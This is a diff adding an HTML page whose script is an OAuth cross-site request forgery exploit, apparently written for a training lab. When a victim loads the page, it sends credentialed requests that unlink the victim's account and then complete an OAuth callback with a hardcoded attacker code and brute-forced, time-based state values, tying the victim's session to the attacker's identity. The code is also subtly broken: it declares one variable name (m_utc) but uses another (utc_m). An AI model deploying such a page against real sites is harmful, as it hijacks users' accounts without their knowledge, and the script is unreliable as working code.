@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  </head>
+  <body>
+<script>
+
+
+(async ()=>{
+    var client_url = "http://ptl-ba5d7197-518a06e2.libcurl.so"
+    var code = "ae9e048a08f1af7477d257055837a7f2714d82cb1671313c05583f98d87fc272"
+    var state = "2021080903"
+
+    function zeroPad(num, size) {
+        num = num.toString();
+        while (num.length < size) num = "0" + num;
+        return num;
+    }
+
+    var d=new Date()
+    var m_utc = d.getUTCMinutes()
+
+    try {
+        await fetch(client_url+"/unlink", {
+            credentials: 'include'
+        })
+    }
+    catch(e) {
+        console.log("BB"+e);
+    }
+    for (let m=utc_m-1; m<utc_m+2; m++)
+    {
+        try {
+            await fetch(client_url+"/users/auth/myprovider", {
+                credentials: 'include'
+            })
+        }
+        catch(e) {
+            console.log("BB"+e);
+        }
+        try {
+            await fetch(client_url+"/users/auth/myprovider/callback?code="+code+"&state="+state+zeroPad(m,2) , {
+                credentials: 'include'
+            })
+        }
+        catch(e) {
+            console.log("BB"+e);
+        }
+    }
+
+})();
+</script>
+  </body>
+</html>
